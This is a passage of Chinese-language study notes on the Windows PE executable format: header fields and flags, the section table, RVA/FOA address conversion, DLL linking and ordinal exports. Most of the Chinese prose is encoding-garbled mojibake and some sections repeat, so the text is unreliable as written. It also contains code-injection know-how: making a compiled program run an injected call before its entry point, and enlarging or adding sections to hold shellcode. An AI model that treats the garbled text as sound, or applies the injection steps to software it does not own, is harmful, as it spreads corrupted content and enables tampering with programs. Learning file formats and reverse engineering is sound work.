‡å‡†PEå¤´æˆ–COFFå¤´ï¼ŒåŒ…å«æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ã€‚\n2ã€æ ‡å‡†PEå¤´ï¼š\tWORD Machine; *\tç¨‹åºè¿è¡Œçš„CPUå‹å·ï¼š0x0 ä»»ä½•å¤„ç†å™¨/0x14C 386åŠåç»­å¤„ç†å™¨\tWORD NumberOfSections; *\tæ–‡ä»¶ä¸­å­˜åœ¨çš„èŠ‚çš„æ€»æ•°,å¦‚æœè¦æ–°å¢èŠ‚æˆ–è€…åˆå¹¶èŠ‚ å°±è¦ä¿®æ”¹è¿™ä¸ªå€¼.\tDWORD TimeDateStamp; *\tæ—¶é—´æˆ³ï¼šæ–‡ä»¶çš„åˆ›å»ºæ—¶é—´(å’Œæ“ä½œç³»ç»Ÿçš„åˆ›å»ºæ—¶é—´æ— å…³)ï¼Œç¼–è¯‘å™¨å¡«å†™çš„.\tDWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; *\tå¯é€‰PEå¤´çš„å¤§å°ï¼Œ32ä½PEæ–‡ä»¶é»˜è®¤E0h 64ä½PEæ–‡ä»¶é»˜è®¤ä¸ºF0h å¤§å°å¯ä»¥è‡ªå®šä¹‰.\tWORD Characteristics; *\tæ¯ä¸ªä½æœ‰ä¸åŒçš„å«ä¹‰ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å€¼ä¸º10F å³0 1 2 3 8ä½ç½®1 Characteristics æ ‡å¿—ä½å¦‚ä¸‹ï¼š\næ ‡å· Characteristics æ ‡å¿—ä½ å±æ€§ 0 IMAGE_FILE_RELOCS_STRIPPED é‡å®šä½ä¿¡æ¯å·²è¢«å‰¥ç¦»ï¼Œæ„å‘³ç€æ–‡ä»¶ä¸­ä¸åŒ…å«é‡å®šä½ä¿¡æ¯ 1 IMAGE_FILE_EXECUTABLE_IMAGE æ–‡ä»¶æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¯ä»¥ä½œä¸ºåº”ç”¨ç¨‹åºç›´æ¥è¿è¡Œ 2 IMAGE_FILE_LINE_NUMS_STRIPPED è¡Œå·ä¿¡æ¯å·²è¢«å‰¥ç¦»ï¼Œæ„å‘³ç€æ–‡ä»¶ä¸­ä¸åŒ…å«è¡Œå·ä¿¡æ¯ 3 IMAGE_FILE_LOCAL_SYMS_STRIPPED ç¬¦å·ä¿¡æ¯å·²è¢«å‰¥ç¦»ï¼Œæ„å‘³ç€æ–‡ä»¶ä¸­ä¸åŒ…å«å±€éƒ¨ç¬¦å·ä¿¡æ¯ 4 IMAGE_FILE_AGGRESIVE_WS_TRIM è°ƒæ•´å·¥ä½œé›†ï¼Œä¼˜åŒ–å†…å­˜ä½¿ç”¨ 5 IMAGE_FILE_LARGE_ADDRESS_AWARE åº”ç”¨ç¨‹åºå¯ä»¥å¤„ç†å¤§äº 2GB çš„åœ°å€ç©ºé—´ 6 æ­¤æ ‡å¿—ä½ä¿ç•™ï¼Œæ²¡æœ‰ç‰¹å®šçš„å±æ€§ 7 IMAGE_FILE_BYTES_REVERSED_LO å­—èŠ‚é¡ºåºåè½¬ï¼ˆä½å­—èŠ‚åºï¼‰ï¼Œæ–‡ä»¶é‡‡ç”¨å°å°¾æ–¹å¼å­˜å‚¨æ•°æ® 8 IMAGE_FILE_32BIT_MACHINE åªåœ¨ 32 ä½å¹³å°ä¸Šè¿è¡Œ 9 IMAGE_FILE_DEBUG_STRIPPED ä¸åŒ…å«è°ƒè¯•ä¿¡æ¯ 10 IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP ä¸èƒ½ä»å¯ç§»åŠ¨ç›˜è¿è¡Œ 11 IMAGE_FILE_NET_RUN FROM_SWAP ä¸èƒ½ä»ç½‘ç»œè¿è¡Œ 12 IMAGE_FILE_SYSTEM ç³»ç»Ÿæ–‡ä»¶ï¼ˆå¦‚é©±åŠ¨ç¨‹åº),ä¸èƒ½ç›´æ¥è¿è¡Œ 13 IMAGE_FILE_DLL è¿™æ˜¯ä¸€ä¸ª DLL æ–‡ä»¶ 14 IMAGE_FILE_UP_SYSTEM_ONLY æ–‡ä»¶ä¸èƒ½åœ¨å¤šå¤„ç†å™¨è®¡ç®—æœºä¸Šè¿è¡Œ 15 IMAGE_FILE_BYTES_REVERSED_HI å¤§å°¾æ–¹å¼ ç´§æ¥ç€ï¼Œå°±æ˜¯å¯é€‰(æ‰©å±•)PEå¤´(IMAGE_OPTIONAL_HEADER):\n3ã€å¯é€‰PEå¤´ï¼š\tWORD Magic; *\tè¯´æ˜æ–‡ä»¶ç±»å‹ï¼š10B 32ä½ä¸‹çš„PEæ–‡ä»¶ 20B 64ä½ä¸‹çš„PEæ–‡ä»¶\tBYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode;*\tæ‰€æœ‰ä»£ç èŠ‚çš„å’Œï¼Œå¿…é¡»æ˜¯FileAlignmentçš„æ•´æ•°å€ ç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD SizeOfInitializedData;*\tå·²åˆå§‹åŒ–æ•°æ®å¤§å°çš„å’Œ,å¿…é¡»æ˜¯FileAlignmentçš„æ•´æ•°å€ ç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD SizeOfUninitializedData;*\tæœªåˆå§‹åŒ–æ•°æ®å¤§å°çš„å’Œ,å¿…é¡»æ˜¯FileAlignmentçš„æ•´æ•°å€ ç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD AddressOfEntryPoint;*\tç¨‹åºå…¥å£\tDWORD BaseOfCode;*\tä»£ç å¼€å§‹çš„åŸºå€ï¼Œç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD BaseOfData;*\tæ•°æ®å¼€å§‹çš„åŸºå€ï¼Œç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD ImageBase;*\tå†…å­˜é•œåƒåŸºå€\tDWORD SectionAlignment;*\tå†…å­˜å¯¹é½\tDWORD FileAlignment;*\tæ–‡ä»¶å¯¹é½\tWORD MajorOperatingSystemVersion;\tWORD MinorOperatingSystemVersion;\tWORD MajorImageVersion;\tWORD MinorImageVersion;\tWORD MajorSubsystemVersion;\tWORD MinorSubsystemVersion;\tDWORD Win32VersionValue;\tDWORD SizeOfImage;*\tå†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶çš„æ˜ å°„çš„å°ºå¯¸ï¼Œå¯ä»¥æ¯”å®é™…çš„å€¼å¤§ï¼Œä½†å¿…é¡»æ˜¯SectionAlignmentçš„æ•´æ•°å€\tDWORD SizeOfHeaders;*\tæ‰€æœ‰å¤´+èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼Œå¦åˆ™åŠ è½½ä¼šå‡ºé”™\tDWORD CheckSum;*\tæ ¡éªŒå’Œï¼Œä¸€äº›ç³»ç»Ÿæ–‡ä»¶æœ‰è¦æ±‚.ç”¨æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹.\tWORD Subsystem;\tWORD DllCharacteristics;\tDWORD SizeOfStackReserve;*\tåˆå§‹åŒ–æ—¶ä¿ç•™çš„å †æ ˆå¤§å° DWORD SizeOfStackCommit;*\tåˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å¤§å° DWORD SizeOfHeapReserve;*\tåˆå§‹åŒ–æ—¶ä¿ç•™çš„å †å¤§å° DWORD SizeOfHeapCommit;*\tåˆå§‹åŒ–æ—¶å®è·µæäº¤çš„å¤§å° DWORD LoaderFlags;\tDWORD NumberOfRvaAndSizes;*\tç›®å½•é¡¹æ•°ç›® DllCharacteristicså±æ€§å¦‚ä¸‹ï¼š\næ ‡å¿—ä½ DllCharacteristicså±æ€§ è¯´æ˜ 0 Reserved å¿…é¡»ä¸º0 1 Reserved å¿…é¡»ä¸º0 2 Reserved å¿…é¡»ä¸º0 3 Reserved å¿…é¡»ä¸º0 4 null null 5 null null 6 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE DLLå¯ä»¥åœ¨åŠ è½½æ—¶è¢«é‡å®šä½ 7 IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY å¼ºåˆ¶ä»£ç å®æ–½å®Œæ•´æ€§éªŒè¯ 8 IMAGE_DLLCHARACTERISTICS_NX_COMPAT è¯¥æ˜ åƒå…¼å®¹ DEP 9 IMAGE_DLLCHARACTERISTICS_NO_ISOLATION å¯ä»¥éš”ç¦»ï¼Œä½†å¹¶ä¸éš”ç¦»æ­¤æ˜ åƒ 10 IMAGE_DLLCHARACTERISTICS_NO_SEH æ²¡æœ‰ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰ 11 IMAGE_DLLCHARACTERISTICS_NO_BIND ä¸ç»‘å®šæ˜ åƒ 12 Reserved å¿…é¡»ä¸º0 13 IMAGE_DLLCHARACTERISTICS_WDM_DRIVER è¯¥æ˜ åƒä¸ºä¸€ä¸ª WDM driver 14 Reserved å¿…é¡»ä¸º0 15 IMAGE_DLLCHARACTERISTICS_TERMINAL SERVER_AWARE å¯ç”¨äºç»ˆç«¯æœåŠ¡å™¨ æœ€åå°±æ˜¯èŠ‚è¡¨\nå¦‚æœèŠ‚ç›¸å½“äºä¹¦é‡Œé¢çš„å†…å®¹ï¼Œé‚£ä¹ˆèŠ‚è¡¨å°±ç›¸å½“äºä¹¦çš„ç›®å½•ã€‚ä¹‹å‰çš„ä»€ä¹ˆDOSå¤´ä¹‹ç±»çš„ç»“æ„å°±ç›¸å½“äºä¹¦çš„å‡ºç‰ˆç¤¾ä»€ä¹ˆçš„ä¿¡æ¯ã€‚ typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // èŠ‚çš„åç§°ï¼Œé•¿åº¦ä¸º8ä¸ªå­—èŠ‚ã€‚é€šå¸¸æ˜¯ä»¥\"\\0\"ç»“å°¾çš„ASCIIå­—ç¬¦ä¸²ï¼Œä½†ç³»ç»Ÿä¼šæˆªå–8ä¸ªå­—èŠ‚çš„å†…å®¹ã€‚åç§°å¯ä»¥è‡ªå®šä¹‰ã€‚ union { DWORD PhysicalAddress; // åœ¨COFFæ ¼å¼ä¸­ç”¨äºæŒ‡ç¤ºç‰©ç†åœ°å€ã€‚å¯¹äºPEæ–‡ä»¶é€šå¸¸ä¸ä½¿ç”¨ã€‚ DWORD VirtualSize; // èŠ‚çš„è™šæ‹Ÿå¤§å°ã€‚åœ¨å†…å­˜ä¸­çš„å®é™…å¤§å°å¯ä»¥ä¸SizeOfRawDataä¸åŒã€‚ } Misc;\t// åŒå­—æ˜¯è¯¥èŠ‚åœ¨æ²¡æœ‰å¯¹é½å‰çš„çœŸå®å°ºå¯¸,è¯¥å€¼å¯ä»¥ä¸å‡†ç¡®ã€‚ DWORD VirtualAddress; // èŠ‚åœ¨å†…å­˜ä¸­çš„è™šæ‹Ÿåœ°å€ï¼ŒåŠ ä¸ŠImageBaseæ‰æ˜¯å†…å­˜ä¸­çš„å®é™…åœ°å€ã€‚ DWORD SizeOfRawData; // èŠ‚åœ¨æ–‡ä»¶ä¸­çš„å¯¹é½åçš„å¤§å°ã€‚åœ¨æ–‡ä»¶ä¸­çš„å®é™…å¤§å°ã€‚ DWORD PointerToRawData; // èŠ‚åœ¨æ–‡ä»¶ä¸­çš„åç§»åœ°å€ï¼ŒæŒ‡å‘èŠ‚çš„å®é™…æ•°æ®ã€‚ DWORD PointerToRelocations; // å¯¹äºobjæ–‡ä»¶ä¸­çš„é‡å®šä½ä¿¡æ¯ä½¿ç”¨ã€‚å¯¹äºexeæ–‡ä»¶ï¼Œé€šå¸¸ä¸º0ã€‚ DWORD PointerToLinenumbers; // è¡Œå·è¡¨çš„åç§»ï¼Œç”¨äºè°ƒè¯•ã€‚å¯¹äºexeæ–‡ä»¶ï¼Œé€šå¸¸ä¸º0ã€‚ WORD NumberOfRelocations; // åœ¨objæ–‡ä»¶ä¸­ä½¿ç”¨ï¼ŒæŒ‡ç¤ºèŠ‚ä¸­é‡å®šä½çš„æ•°é‡ã€‚å¯¹äºexeæ–‡ä»¶ï¼Œé€šå¸¸ä¸º0ã€‚ WORD NumberOfLinenumbers; // è¡Œå·è¡¨ä¸­è¡Œå·çš„æ•°é‡ï¼Œç”¨äºè°ƒè¯•ã€‚å¯¹äºexeæ–‡ä»¶ï¼Œé€šå¸¸ä¸º0ã€‚ DWORD Characteristics; // èŠ‚çš„å±æ€§æ ‡å¿—ï¼Œå¦‚æ˜¯å¦ä¸ºå¯æ‰§è¡Œä»£ç ã€æ˜¯å¦å¯è¯»ã€æ˜¯å¦å¯å†™ç­‰ã€‚ } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;\tæ‰€ä»¥ï¼ŒèŠ‚è¡¨çš„ç»“æ„å¦‚ä¸‹ï¼š\nå®Œæ•´å¦‚ä¸‹ï¼š\n1ã€DOSå¤´ï¼š\tWORD e_magic *\t\"MZæ ‡è®°\" ç”¨äºåˆ¤æ–­æ˜¯å¦ä¸ºå¯æ‰§è¡Œæ–‡ä»¶.\tDWORD e_lfanew; *\tPEå¤´ç›¸å¯¹äºæ–‡ä»¶çš„åç§»ï¼Œç”¨äºå®šä½PEæ–‡ä»¶\t2ã€æ ‡å‡†PEå¤´ï¼š\tWORD Machine; *\tç¨‹åºè¿è¡Œçš„CPUå‹å·ï¼š0x0 ä»»ä½•å¤„ç†å™¨/0x14C 386åŠåç»­å¤„ç†å™¨\tWORD NumberOfSections; *\tæ–‡ä»¶ä¸­å­˜åœ¨çš„èŠ‚çš„æ€»æ•°,å¦‚æœè¦æ–°å¢èŠ‚æˆ–è€…åˆå¹¶èŠ‚ å°±è¦ä¿®æ”¹è¿™ä¸ªå€¼.\tDWORD TimeDateStamp; *\tæ—¶é—´æˆ³ï¼šæ–‡ä»¶çš„åˆ›å»ºæ—¶é—´(å’Œæ“ä½œç³»ç»Ÿçš„åˆ›å»ºæ—¶é—´æ— å…³)ï¼Œç¼–è¯‘å™¨å¡«å†™çš„.\tDWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; *\tå¯é€‰PEå¤´çš„å¤§å°ï¼Œ32ä½PEæ–‡ä»¶é»˜è®¤E0h 64ä½PEæ–‡ä»¶é»˜è®¤ä¸ºF0h å¤§å°å¯ä»¥è‡ªå®šä¹‰.\tWORD Characteristics; *\tæ¯ä¸ªä½æœ‰ä¸åŒçš„å«ä¹‰ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å€¼ä¸º10F å³0 1 2 3 8ä½ç½®1 3ã€å¯é€‰PEå¤´ï¼š\tWORD Magic; *\tè¯´æ˜æ–‡ä»¶ç±»å‹ï¼š10B 32ä½ä¸‹çš„PEæ–‡ä»¶ 20B 64ä½ä¸‹çš„PEæ–‡ä»¶\tBYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode;*\tæ‰€æœ‰ä»£ç èŠ‚çš„å’Œï¼Œå¿…é¡»æ˜¯FileAlignmentçš„æ•´æ•°å€ ç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD SizeOfInitializedData;*\tå·²åˆå§‹åŒ–æ•°æ®å¤§å°çš„å’Œ,å¿…é¡»æ˜¯FileAlignmentçš„æ•´æ•°å€ ç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD SizeOfUninitializedData;*\tæœªåˆå§‹åŒ–æ•°æ®å¤§å°çš„å’Œ,å¿…é¡»æ˜¯FileAlignmentçš„æ•´æ•°å€ ç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD AddressOfEntryPoint;*\tç¨‹åºå…¥å£\tDWORD BaseOfCode;*\tä»£ç å¼€å§‹çš„åŸºå€ï¼Œç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD BaseOfData;*\tæ•°æ®å¼€å§‹çš„åŸºå€ï¼Œç¼–è¯‘å™¨å¡«çš„ æ²¡ç”¨\tDWORD ImageBase;*\tå†…å­˜é•œåƒåŸºå€\tDWORD SectionAlignment;*\tå†…å­˜å¯¹é½\tDWORD FileAlignment;*\tæ–‡ä»¶å¯¹é½\tWORD MajorOperatingSystemVersion;\tWORD MinorOperatingSystemVersion;\tWORD MajorImageVersion;\tWORD MinorImageVersion;\tWORD MajorSubsystemVersion;\tWORD MinorSubsystemVersion;\tDWORD Win32VersionValue;\tDWORD SizeOfImage;*\tå†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶çš„æ˜ å°„çš„å°ºå¯¸ï¼Œå¯ä»¥æ¯”å®é™…çš„å€¼å¤§ï¼Œä½†å¿…é¡»æ˜¯SectionAlignmentçš„æ•´æ•°å€\tDWORD SizeOfHeaders;*\tæ‰€æœ‰å¤´+èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼Œå¦åˆ™åŠ è½½ä¼šå‡ºé”™\tDWORD CheckSum;*\tæ ¡éªŒå’Œï¼Œä¸€äº›ç³»ç»Ÿæ–‡ä»¶æœ‰è¦æ±‚.ç”¨æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹.\tWORD Subsystem;\tWORD DllCharacteristics;\tDWORD SizeOfStackReserve;*\tåˆå§‹åŒ–æ—¶ä¿ç•™çš„å †æ ˆå¤§å° DWORD SizeOfStackCommit;*\tåˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å¤§å° DWORD SizeOfHeapReserve;*\tåˆå§‹åŒ–æ—¶ä¿ç•™çš„å †å¤§å° DWORD SizeOfHeapCommit;*\tåˆå§‹åŒ–æ—¶å®è·µæäº¤çš„å¤§å° DWORD LoaderFlags;\tDWORD NumberOfRvaAndSizes;*\tç›®å½•é¡¹æ•°ç›® PEåŠ è½½çš„è¿‡ç¨‹ï¼š\næ ¹æ®SizeOfImageçš„å¤§å°ï¼Œå¼€è¾Ÿä¸€å—ç¼“å†²åŒº(ImageBuffer) æ ¹æ®SizeOfHeaderçš„å¤§å°ï¼Œå°†å¤´ä¿¡æ¯ä»FileBufferæ‹·è´åˆ°ImageBuffer æ ¹æ®èŠ‚è¡¨ä¸­çš„ä¿¡æ¯å¾ªç¯å°†FileBufferä¸­çš„èŠ‚æ‹·è´åˆ°ImageBufferä¸­ â€RVAä¸FOAçš„è½¬æ¢ å› ä¸ºè¿è¡Œçš„ç¨‹åºå…¨å±€å˜é‡çš„åˆå§‹å€¼åœ¨æœªè¿è¡Œçš„ç¨‹åºä¸­ä¹Ÿå­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚ä½•é€šè¿‡è¿è¡Œç¨‹åºçš„åœ°å€çš„å€¼ï¼Œæ¥æ¨å‡ºç¨‹åºåœ¨æœªè¿è¡Œæ—¶è¿™ä¸ªå€¼å¯¹åº”çš„åœ°å€ã€‚\nâ€RVAç›¸å¯¹è™šæ‹Ÿåœ°å€\nâ€RVA=address(ç¨‹åºè¿è¡Œæ—¶è¦æ‰¾å€¼çš„åœ°å€)-ImageBase\nFOAæ–‡ä»¶åç§»åœ°å€(ç¨‹åºæœªè¿è¡Œè¦æ‰¾çš„åœ°å€)\nå¯¹åº”å…³ç³»(ä¸è¿‡ç°åœ¨çš„ç¨‹åºè¿è¡Œå’Œæœªè¿è¡Œæ˜¯å¯¹é½éƒ½ç›¸ç­‰ï¼Œæ‰€ä»¥ç›´æ¥FOA=RVA)ï¼š\nå¦‚æœåœ¨å¤´éƒ¨(å‰é¢æ²¡æœ‰èŠ‚çš„å¯¹é½) FOA=RVA\nä¸åœ¨å¤´éƒ¨(èŠ‚å†…çš„å·®å€¼æ˜¯ç›¸åŒçš„)\nRVA \u003e=èŠ‚.VirtualAddress RVA \u003c= èŠ‚.VirtualAddress + å½“å‰èŠ‚å†…å­˜å¯¹é½åçš„å¤§å° å·®å€¼ = RVA - èŠ‚.VirtualAddress FOA =èŠ‚.PointerToRawData +å·®å€¼ å®éªŒï¼šåœ¨ç¼–è¯‘å¥½çš„ç¨‹åºæ‰§è¡Œå‰å¼¹ä¸ªçª—å£ æ±‡ç¼–å¯¹åº”ç¡¬ç¼–ç \n6A 00 ï¼špush 0\tE8 è·³è½¬å€¼ ï¼šcall è¦è·³è½¬çš„åœ°å€\nè®¡ç®—è¦è·³è½¬åœ°å€çš„ç¡¬ç¼–ç ï¼š\nè·³è½¬å€¼=è¦è·³è½¬çš„åœ°å€-E8(call)æŒ‡ä»¤å½“å‰çš„åœ°å€-5(å¯¹é½åˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤) æ‰©å¤§èŠ‚ å½“æˆ‘ä»¬æƒ³æ·»åŠ çš„ä»£ç æˆ–è€…shellcodeæ¯”è¾ƒå¤šï¼Œç¨‹åºæ²¡åœ°æ–¹å†™çš„è¯å¯ä»¥é€‰æ‹©æ‰©å¤§èŠ‚ï¼Œç”±äºå¯¹é½çš„åŸå› ï¼Œæ‰©å¤§æœ€åä¸€ä¸ªèŠ‚å¯¹å…¶ä»–èŠ‚çš„å½±å“æœ€å°ï¼Œæ˜¯æœ€ä¼˜é€‰æ‹©\næ‰©å¤§èŠ‚çš„æ­¥éª¤ï¼š\nåˆ†é…ä¸€å—æ–°çš„ç©ºé—´,å¤§å°ä¸ºS\nå°†æœ€åä¸€ä¸ªèŠ‚çš„SizeOfRawDataå’ŒVirtualSizeæ”¹æˆN\nN = (SizeOfRawDataæˆ–è€…VirtualSizeå†…å­˜å¯¹é½åçš„å€¼) + S\nä¿®æ”¹SizeOflmageå¤§å°\næ–°å¢èŠ‚ æ–°å¢èŠ‚çš„æ­¥éª¤ï¼š\nåˆ¤æ–­æ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´,å¯ä»¥æ·»åŠ ä¸€ä¸ªèŠ‚è¡¨. åœ¨èŠ‚è¡¨ä¸­æ–°å¢ä¸€ä¸ªæˆå‘˜. ä¿®æ”¹PEå¤´ä¸­èŠ‚çš„æ•°é‡. ä¿®æ”¹sizeOflmageçš„å¤§å°. å†åŸæœ‰æ•°æ®çš„æœ€å,æ–°å¢ä¸€ä¸ªèŠ‚çš„æ•°æ®(å†…å­˜å¯¹é½çš„æ•´æ•°å€). ä¿®æ­£æ–°å¢èŠ‚è¡¨çš„å±æ€§. é™æ€é“¾æ¥åº“-åŠ¨æ€é“¾æ¥åº“ é™æ€é“¾æ¥åº“ï¼š\nå°†xxx.hå’Œxxx.libå¤åˆ¶åˆ°è¦ä½¿ç”¨çš„é¡¹ç›®ä¸­ï¼ˆå°±æ˜¯ä½ å†™çš„libï¼‰ åœ¨éœ€è¦ä½¿ç”¨çš„æ–‡ä»¶ä¸­åŒ…å«ï¼š#include \"xxx.h\" åœ¨éœ€è¦ä½¿ç”¨çš„æ–‡ä»¶ä¸­åŒ…å«ï¼š#pragma comment(lib, \"xxx.lib\")ï¼›æˆ–è€…æ”¹é¡¹ç›®è®¾ç½®ä¸­çš„linkå°†xxx.libåŠ å…¥ ä½¿ç”¨é™æ€é“¾æ¥åº“å…¶å®å°±æ˜¯æŠŠä½ å†™çš„xxx.hæ–‡ä»¶é‡Œçš„å‡½æ•°å…¨éƒ¨ç¼–è¯‘åˆ°ç¨‹åºé‡Œé¢äº†ï¼Œä½¿ç”¨é™æ€é“¾æ¥ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä½“ç§¯è¾ƒå¤§ï¼Œé€ æˆæµªè´¹ã€‚\nåŠ¨æ€é“¾æ¥åº“ï¼š\néšå¼é“¾æ¥ï¼šï¼ˆå°±æ˜¯ç¼–è¯‘å™¨æ›¿ä½ å»é“¾æ¥ï¼‰\nå°†*.dll *.libæ”¾åˆ°å·¥ç¨‹ç›®å½•ä¸‹é¢ï¼ˆä¸»è¦åŠŸèƒ½åœ¨dllé‡Œé¢ï¼Œè¿™ä¸ªlibå…¶å®å°±æ˜¯å‘Šè¯‰ç¨‹åºå‡½æ•°åœ¨å“ªé‡Œï¼‰\nå°†#pragma comment(lib,\"DLLå.lib\")æ·»åŠ åˆ°è°ƒç”¨æ–‡ä»¶ä¸­\nåŠ å…¥å‡½æ•°çš„å£°æ˜ï¼š\nextern \"C\" __declspec(dllimport) __stdcall int Plus (int x,int y); extern \"C\" __declspec(dllimport) __stdcall int Sub (int x,int y); extern \"C\" __declspec(dllimport) __stdcall int Mul (int x,int y); extern \"C\" __declspec(dllimport) __stdcall int Div (int x,int y); __declspec(dllimport)å‘Šè¯‰ç¼–è¯‘å™¨æ­¤å‡½æ•°ä¸ºå¯¼å…¥å‡½æ•°ï¼›\n__declspec(dllexport)å‘Šè¯‰ç¼–è¯‘å™¨æ­¤å‡½æ•°ä¸ºå¯¼å‡ºå‡½æ•°ï¼›\nextern \"C\"çš„æ„æ€æ˜¯ç”¨Cè¯­è¨€çš„è¯­æ³•è¿›è¡Œç¼–è¯‘å’Œé“¾æ¥ï¼Œå»æ‰çš„è¯å‡½æ•°åç§°åé¢ä¼šåŠ ä¹±ç ï¼Œä½œç”¨æ˜¯åç§°ç²‰ç¢\næ˜¾ç¤ºé“¾æ¥ï¼šï¼ˆè‡ªå·±å»é“¾æ¥ï¼‰\nå®šä¹‰å‡½æ•°æŒ‡é’ˆï¼š\ntypedef int (__stdcall *lpPlus)(int,int); typedef int (__stdcall *lpSub)(int,int); typedef int (__stdcall *lpMul)(int,int); typedef int (__stdcall *lpDiv)(int,int); //å®šä¹‰æ–°çš„ç±»å‹ å£°æ˜å‡½æ•°æŒ‡é’ˆå˜é‡ï¼š\nlpPlus myPlus; lpSub mySub; lpMul myMul; lpDiv myDiv; åŠ¨æ€åŠ è½½dllåˆ°å†…å­˜ä¸­ï¼š\nHINSTANCE hModule = LoadLibrary(\"DllDemo.dll\"); è·å–å‡½æ•°åœ°å€ï¼š\nmyPlus = (lpPlus)GetProcAddress(hModule, \"_Plus@8\"); mySub = (lpSub)GetProcAddress(hModule, \"_Sub@8\"); myMul = (lpMul)GetProcAddress(hModule, \"_Mul@8\"); myDiv = (lpDiv)GetProcAddress(hModule, \"_Div@8\"); //@åé¢çš„8æ˜¯æŒ‡åé¢æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªå‚æ•°4å­—èŠ‚ è°ƒç”¨å‡½æ•°ï¼š\nint a = myPlus(10,2); int b = mySub(10,2); int c = myMul(10,2); int d = myDiv(10,2); Handleæ˜¯ä»£è¡¨ç³»ç»Ÿçš„å†…æ ¸å¯¹è±¡ï¼Œå¦‚æ–‡ä»¶å¥æŸ„ï¼Œçº¿ç¨‹å¥æŸ„ï¼Œè¿›ç¨‹å¥æŸ„ã€‚å…¶å®å°±æ˜¯æ“ä½œç³»ç»Ÿåˆ†çš„ä¸€ä¸ªæ–‡ä»¶ç¼–å·ï¼Œçº¿ç¨‹ç¼–å·æˆ–è€…æ˜¯è¿›ç¨‹ç¼–å·ã€‚é¿å…ç”¨æˆ·å°†å¥æŸ„è¿›è¡Œè¿ç®—ï¼ˆunsign4å­—èŠ‚ï¼‰\nGetProcAddressçš„ç¬¬ä¸€ä¸ªå‚æ•°hModuleå…¶å®å°±æ˜¯æ¨¡å—çš„RVA\nä½¿ç”¨åºå·å¯¼å‡ºï¼š\n*.hæ–‡ä»¶ï¼š\nint Plus (int x,int y); int Sub (int x,int y); int Mul (int x,int y); int Div (int x,int y); *.cppæ–‡ä»¶ï¼š\nint Plus(int x,int y) { return x+y; } int Sub(int x,int y) { return x-y; } int Mul(int x,int y) { return x*y; } int Div(int x,int y) { return x/y;\t} *.defæ–‡ä»¶ï¼š\nEXPORTS Plus @12 Sub\t@15 NONAME Mul @13 Div @16 åé¢çš„æ•°å­—å°±æ˜¯å‡½æ•°çš„å¯¼å‡ºåºå·ï¼ŒNONAMEæŒ‡çš„æ˜¯æ— åå­—ï¼Œéšè—åç§°\nåå­—æ˜¯ä¸€æ®µç¨‹åºå°±ç²¾åçš„æ³¨é‡Š,é€šè¿‡åå­—å¯ä»¥ç›´æ¥çŒœæµ‹åˆ°å‡½æ•°çš„åŠŸèƒ½ï¼Œé€šè¿‡ä½¿ç”¨åºå·ï¼Œå¯ä»¥è¾¾åˆ°éšè—çš„ç›®çš„.\nå¯¼å‡ºè¡¨ ä¸€ä¸ªç¨‹åºæ˜¯ç”±å¤šä¸ªé…æ–‡ä»¶æ‰€ç»„æˆï¼Œé‚£ä¹ˆè¿™ä¸ªç¨‹åºä½¿ç”¨äº†å“ªäº›dllæ–‡ä»¶ï¼Œä¼šåœ¨ä¸€ä¸ªè¡¨ä¸­è®°å½•ï¼Œè¿™å°±æ˜¯å¯¼å…¥è¡¨ï¼›åŒæ 